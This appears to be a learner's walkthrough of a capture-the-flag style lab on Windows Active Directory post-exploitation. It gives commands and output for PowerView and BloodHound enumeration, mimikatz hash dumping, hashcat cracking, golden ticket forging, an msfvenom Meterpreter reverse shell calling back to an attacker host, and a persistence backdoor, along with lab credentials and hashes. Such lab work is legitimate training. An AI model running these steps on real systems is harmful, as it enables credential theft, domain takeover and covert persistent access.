POST-EXPLOITATION BASICS.




[>>> TASK 1: INTRODUCTION]
[1.1. DEPLOY THE MACHINE]
Nothing to answer here.




[>>> TASK 2: ENUMERATION W/ POWERVIEW]
[NOTE]
Creds: Admin|P@$$W0rd
[ACTION: ssh into machine]
ssh Admin@10.10.14.157


[ACTION: start powershell bypassing policy execution]
powershell -ep bypass


[ACTION: start powerview]
. .\Downloads\PowerView.ps1


[ACTION: enumerate domain users]
Get-NetUser | select cn
[OUTPUT]
cn
--
Administrator       
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW} 
sshd


[ACTION: enumerate domain groups]
Get-NetGroup -GroupName *admin*
[OUTPUT]
Administrators 
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins



[2.1. WHAT IS THE SHARED FOLDER THAT IS NOT SET BY DEFAULT?]
[ACTION: find shared folders]
Invoke-ShareFinder
[OUTPUT]
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
[ANSWER]
Share



[2.2. WHAT OPERATING SYSTEM IS RUNNING INSIDE OF THE NETWORK BESIDES WINDOWS SERVER 2019?]
[ACTION: check os of computers in domain]
Get-NetComputer -FullData | Select-Object name, operatingsystem
[OUTPUT]
name            operatingsystem
----            ---------------
DOMAIN-CONTROLL Windows Server 2019 Standard
DESKTOP-2       Windows 10 Enterprise Evaluation
DESKTOP-1       Windows 10 Enterprise Evaluation
[ANSWER]
Windows 10 Enterprise Evalation



[2.3. I'VE HIDDEN A FLAG INSIDE OF THE USERS FIND IT]
[ANSWER (based on our user enumeration output)]
POST{P0W3RV13W_FTW}




[>>> TASK 3: ENUMERATION W/ BLOODHOUND]
[ACTION: run sharphound]
. .\Downloads\SharpHound.ps1


[ACTION: run bloodhound]
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
[OUPTUT (snippet)]
Compressing data to C:\Users\Administrator\20250727023057_loot.zip

[NOTE]
Creds reminder: Admin|P@$$W0rd
[ACTION: move loot to less restricted directory (can't scp otherwise)]
Copy-Item "C:\Users\Administrator\20250727023057_loot.zip" "C:\Use
rs\Public\loot.zip"


[ACTION: scp loot to attacker]
scp Administrator@10.10.14.157:"C:/Users/Public/loot.zip" ./loot.zip

[NOTE]
Default neo4j creds:
user: neo4j
password: neo4j
[ACTION: install and run bloodhound]
1. Install: apt-get install bloodhound
2. Run: bloodhound
3. When redirected to web, complete username and password for neo4j.
4. Click connect.
5. Set new password.
6. ADDITIONAL: my bloodhound looped asking to ran setup. i had to do sudo nano /etc/bhapi/bhapi.json and manually change the neo4j secret value to my updated password.
[NOTE]
Even more errores trying to get the bloodhound login to work.



[3.1. WHAT SERVICE IS ALSO A DOMAIN ADMIN]
[ANSWER]
sqlservice



[3.2. WHAT TWO USERS ARE KERBEROASTABLE?]
[ANSWER]
sqlservice, krbtgt




[>>> TASK 4: DUMPING HASHES W/ MIMIKATZ]
[ACTION: run mimikatz]
cd Downloads
.\mimikatz.exe


[ACTION: verify we are running as admin]
privilege::debug
[OUTPUT]
Privilege '20' OK 
[NOTE]
That indicates we are.


[ACTION: dump hashes]
lsadump::lsa /patch
[OUTPUT]
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :  
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : 76bea992f6411b723f446f8a2da3d550

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a


[4.1. WHAT IS THE Machine1 Password?]
[NOTE (from last output)]
RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b
[ACTION: crack machine1]
echo "64f12cddaa88057e06a81b54e73b949b" > hash.txt
hashcat -m 1000 -a 0 hash.txt ~/thm/rockyou.txt
[OUTPUT]
64f12cddaa88057e06a81b54e73b949b:Password1                
[ANSWER]
Password1



[4.2. WHAT IS THE Machine2 HASH?]
[ANSWER (from previous output)]
c39f2beb3d2ec06a62cb887fb391dee0




[>>> TASK 5: GOLDEN TICKET ATTACKS W/ MIMIKATZ]
[ACTION: dump hash and security id of kerberos ticket granting ticket account]
lsadump::lsa /inject /name:krbtgt
[OUTPUT]
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0 
    03  71288a6388fb28088a434d3705cc6f2a 
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea 
    05  7902703149b131c57e5253fd9ea710d0 
    06  df5ad3cc1ff643663d85dabc81432a81 
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea 
    08  a489809bd0f8e525f450fac01ea2054b 
    09  19e54fd00868c3b0b35b5e0926934c99 
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c 
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e 
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75f
e53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4

[NOTE]
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
User : krbtgt
NTLM : 5508500012cc005cf7082a9a89ebdfdf
[ACTION: create golden ticket]
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420
856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500


[ACTION: use golden ticket/spawn cmd with elevated privileges to all machines]
misc::cmd
[OUTPUT]
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7FBF643B8 




[>>> TASK 6: ENUMERATION W/ SERVER MANAGER]
[ACTION: rdp to machine]
remmina -c rdp://Administrator@10.10.14.157


[ACTION: search for active directory users and computers with windows browser]



[6.1. WHAT TOOL ALLOWS TO VIEW THE EVENT LOGS?]
[ANSWER]
Event Viewer



[6.2. WHAT IS THE SQL SERVICE PASSWORD]
[ACTION: click SQL Service user]
[OUTPUT]
Description: My password is MYpassword123#	




[>>> TASK 7: MAINTAINING ACCESS]
[ACTION: generate payload via msfvenom]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.25.109 LPORT=5555 -f exe -o shell.exe


[ACTION: transfer payload to machine]
scp shell.exe Administrator@10.10.14.157:"C:\\Users\\Public\\"


[NOTE]
Same LPORT as in our msfvenom payload.
[ACTION: create listener]
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.23.25.109
set LPORT 5555
run


[ACTION: spawn meterpreter shell (by running the .exe)]
Start-Process "C:\Users\Public\shell.exe"
[OUTPUT]
meterpreter > 


[ACTION: run persistence module]
background
use exploit/windows/local/persistence
set session 1
run
[NOTE]
Without persistence, any system shut down or reseet would cause us to loose our meterpreter session.
However, with the persistence module we create a backdoor that we can access anytime by using multi handler and payload windows/meterpreter/reverse_tcp.
This way we can send another meterpreter payload, and open another meterperter session.



[7.1. I UNDERSTAND HOW TO INSTALL A BACKDOOR ON A SYSTEM USING THE PERSISTENCE MODULE]
Nothing to answer here.




[>>> TASK 8: CONCLUSION]
[8.1. I UNDERSTAND THE BASICS OF POST-EXPLOITATION]
Nothing to answer here.
